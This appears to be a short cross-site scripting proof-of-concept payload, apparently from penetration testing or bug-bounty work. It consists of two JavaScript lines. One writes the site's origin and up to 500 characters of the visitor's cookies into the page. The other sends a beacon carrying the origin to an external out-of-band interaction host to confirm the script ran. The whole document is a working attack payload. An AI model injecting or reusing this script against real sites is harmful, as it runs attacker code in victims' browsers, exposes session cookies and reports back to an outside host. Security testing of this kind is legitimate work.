document.write('<h1>p50 XSS fired on '+location.origin+'</h1><pre>'+document.cookie.substring(0,500)+'</pre>');
new Image().src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p50-alive?o='+encodeURIComponent(location.origin);
